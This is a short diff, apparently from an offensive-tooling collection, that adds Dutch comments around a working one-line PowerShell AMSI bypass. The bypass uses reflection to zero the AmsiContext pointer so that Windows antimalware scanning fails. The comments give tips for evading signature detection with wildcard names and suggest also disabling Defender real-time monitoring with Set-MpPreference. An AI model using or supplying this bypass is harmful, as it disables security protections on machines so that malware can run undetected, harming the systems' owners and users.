@@ -1,1 +1,10 @@
+# AMSI Bypass - AmsiContext null pointer via reflection
+# Zet AmsiContext naar 0 via reflection, waardoor AmsiScanBuffer faalt
+# Werkt in PowerShell 5.1+ (pre-Win11)
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+# Test of bypass werkt:
+'AmsiUtils'
+# Tip: Gebruikt wildcard matching (*iUtils, *Context) om signature detectie te ontwijken
+# Tip: Kan falen op Windows 11+ door AMSI hardening
+# Tip: Combineer met Set-MpPreference -DisableRealtimeMonitoring $true (vereist admin)
+# Tip: Zie ook: amsi_bypass_reflection voor vergelijkbare techniek
